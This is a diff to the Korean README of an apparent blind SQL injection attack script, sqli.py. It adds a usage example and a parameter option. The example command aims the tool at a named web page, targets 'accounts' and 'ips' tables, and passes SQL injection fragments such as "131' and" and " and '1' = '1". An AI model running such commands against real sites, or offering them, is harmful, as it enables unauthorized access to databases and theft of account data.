@@ -11,6 +11,10 @@ Bliend SQL Injection 공격을 실행하는 코드입니다.
                  [-m METHOD] [-l LIM]
                  execution
   ```
+## 사용 예제
+```bash
+  EX: python sqli.py -u http://nk.iqsp.com/nk/conent.php -t accounts ips -p id=kaya pw=passwd -q id -s "131' and" -sign Hacked -e " and '1' = '1" data'
+```
 
 ## 옵션
   
@@ -49,4 +53,6 @@ Bliend SQL Injection 공격을 실행하는 코드입니다.
   -m METHOD, --method METHOD
                         HTTP 메서드 지정. (G)/P
   -l LIM, --lim LIM     데이터 갯수 제한
+  -p PARA [PARA ...], --para PARA [PARA ...]
+                        파라미터 값 지정
   ```
